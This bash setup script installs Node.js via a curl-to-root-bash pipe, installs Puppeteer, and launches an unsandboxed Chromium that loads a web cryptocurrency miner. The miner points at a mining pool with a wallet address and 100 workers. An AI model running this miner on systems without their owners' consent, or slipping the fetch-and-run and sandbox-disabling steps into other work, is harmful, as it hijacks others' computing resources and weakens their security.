#!/bin/bash

# Set the script to exit on any command failure
set -e

# Navigate to the directory where the script is located
cd "$(dirname "$0")"

# Install Node.js and npm if not already installed
if ! command -v node &> /dev/null; then
    echo "Node.js not found, installing..."
    sudo apt update
    sudo apt install -y curl
    curl -fsSL https://deb.nodesource.com/setup_current.x | sudo -E bash -
    sudo apt install -y nodejs
fi

# Ensure npm is up to date
sudo npm install -g npm

# Install necessary libraries for Chromium
echo "Installing necessary libraries for Chromium..."
sudo apt update
sudo apt install -y libnss3 libatk-bridge2.0-0 libatk1.0-0 libcups2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libxshmfence1 libxft2 libx11-xcb1 libgbm1 libasound2

# Create a package.json file if it doesn't exist
if [ ! -f "package.json" ]; then
    echo "Creating package.json..."
    npm init -y
fi

# Install Puppeteer if not already installed
if ! npm ls puppeteer &> /dev/null; then
    echo "Installing Puppeteer..."
    npm install puppeteer
fi

# Create or overwrite the Node.js script file
cat << 'EOF' > script.js
const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ headless: false, args: ['--no-sandbox', '--disable-setuid-sandbox'] });
  const page = await browser.newPage();

  // Open the specified URL
  await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=100');

  // Wait indefinitely or until you decide to close it manually
  console.log('Browser is open and running...');

  // Uncomment the following line if you want to close the browser programmatically after a certain time
  // await new Promise(resolve => setTimeout(resolve, 3600000)); // Keeps the browser open for 1 hour

  // Uncomment this line if you want to close the browser manually later
  // await browser.close();
})();
EOF

# Run the Node.js script
node script.js
